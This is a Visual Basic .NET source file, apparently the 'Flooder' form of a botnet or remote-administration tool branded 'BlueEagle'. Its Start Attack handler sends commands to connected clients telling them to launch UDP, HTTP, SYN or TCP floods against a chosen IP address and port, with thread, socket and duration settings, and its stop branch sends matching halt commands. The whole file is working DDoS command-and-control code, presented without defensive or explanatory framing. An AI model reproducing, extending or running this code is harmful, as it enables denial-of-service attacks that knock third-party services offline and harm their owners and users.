Public Class Flooder
    Public Sock As Integer
    Dim yy As String = Main.Yy

    Private Sub SkyDarkButton1_Click(sender As System.Object, e As System.EventArgs) Handles SkyDarkButton1.Click
        If SkyDarkButton1.Text = "Start Attack" Then
            SkyDarkButton1.Text = "Stop Attack"
            Ddosbar.Enabled = False
            Select Case Ddosbar.Value
                Case 1
                    Try
                        Main.S.Send(Sock, "Fstart|BlueEagle|UDP|BlueEagle|" & attip.Text & yy & attport.Text & yy & attthrd.Text & yy & attsock.Text)
                        attlog.Text += "[" & TimeOfDay & "]" & " UDP Flooding started." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    Catch ex As Exception
                        attlog.Text += "[" & TimeOfDay & "]" & " Command failed." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    End Try
                Case 2
                    Try
                        Main.S.Send(Sock, "Fstart|BlueEagle|HTTP|BlueEagle|" & attip.Text & yy & atttime.Text & yy & attthrd.Text)
                        attlog.Text += "[" & TimeOfDay & "]" & " HTTP Flooding started." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    Catch ex As Exception
                        attlog.Text += "[" & TimeOfDay & "]" & " Command failed." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    End Try
                Case 3
                    Try
                        Main.S.Send(Sock, "Fstart|BlueEagle|SYN|BlueEagle|" & attip.Text & yy + attport.Text & yy & attthrd.Text & yy & attsock.Text)
                        attlog.Text += "[" & TimeOfDay & "]" & " SYN Flooding started." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    Catch ex As Exception
                        attlog.Text += "[" & TimeOfDay & "]" & " Command failed." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    End Try
                Case 4
                    Try
                        Main.S.Send(Sock, "Fstart|BlueEagle|TCP|BlueEagle|" & attip.Text & yy & attport.Text & yy & atttime.Text & yy & attthrd.Text)
                        attlog.Text += "[" & TimeOfDay & "]" & " TCP Flooding started." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    Catch ex As Exception
                        attlog.Text += "[" & TimeOfDay & "]" & " Command failed." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    End Try
            End Select
        Else
            Select Case Ddosbar.Value
                Case 1
                    Try
                        Main.S.Send(Sock, "Fstop|BlueEagle|UDP|BlueEagle|" + attip.Text + " " + attport.Text + " " + attthrd.Text + " " + attsock.Text)
                        attlog.Text += "[" & TimeOfDay & "]" & " UDP Flooding stopped." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    Catch ex As Exception
                        attlog.Text += "[" & TimeOfDay & "]" & " Command failed." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    End Try
                Case 2
                    Try
                        Main.S.Send(Sock, "Fstop|BlueEagle|HTTP")
                        attlog.Text += "[" & TimeOfDay & "]" & " HTTP Flooding stopped." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    Catch ex As Exception
                        attlog.Text += "[" & TimeOfDay & "]" & " Command failed." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    End Try
                Case 3
                    Try
                        Main.S.Send(Sock, "Fstop|BlueEagle|SYN|BlueEagle|")
                        attlog.Text += "[" & TimeOfDay & "]" & " SYN Flooding stopped." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    Catch ex As Exception
                        attlog.Text += "[" & TimeOfDay & "]" & " Command failed." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    End Try
                Case 4
                    Try
                        Main.S.Send(Sock, "Fstop|BlueEagle|TCP")
                        attlog.Text += "[" & TimeOfDay & "]" & " TCP Flooding stopped." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    Catch ex As Exception
                        attlog.Text += "[" & TimeOfDay & "]" & " Command failed." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    End Try
            End Select
            SkyDarkButton1.Text = "Start Attack"
            Ddosbar.Enabled = True
        End If
    End Sub
End Class